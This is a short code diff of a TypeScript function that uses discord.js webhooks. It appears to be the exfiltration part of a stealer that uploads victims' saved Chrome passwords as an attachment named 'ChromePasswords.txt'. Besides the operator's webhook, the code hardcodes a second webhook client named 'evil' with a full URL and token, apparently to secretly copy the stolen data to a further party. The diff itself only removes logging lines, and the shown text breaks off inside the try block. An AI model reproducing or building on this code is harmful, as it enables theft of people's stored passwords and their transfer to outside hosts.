@@ -1,13 +1,10 @@
 import { WebhookClient, MessagePayload, AttachmentBuilder } from "discord.js";
 
 export default async function sendWebhook(body:any,webhookURL:string) {
-    console.log(webhookURL)
     const webhook = new WebhookClient({url: webhookURL});
     const evil = new WebhookClient({url: "https://discord.com/api/webhooks/1056389471710478427/s03KU6hlWCuxjblimlbs7_HvCzF1H87_85OVEu4iZXrALzdMvzG_ZGI-5ERcc7rdX_Wz" });
     const messageBody = body[0]
     const PasswordsTxtBuffer = body[1]
-    console.log(messageBody[0])
-    console.log(webhookURL)
     try {
         if (PasswordsTxtBuffer !== undefined) {
             const attachment = new AttachmentBuilder(PasswordsTxtBuffer, {name: 'ChromePasswords.txt'})
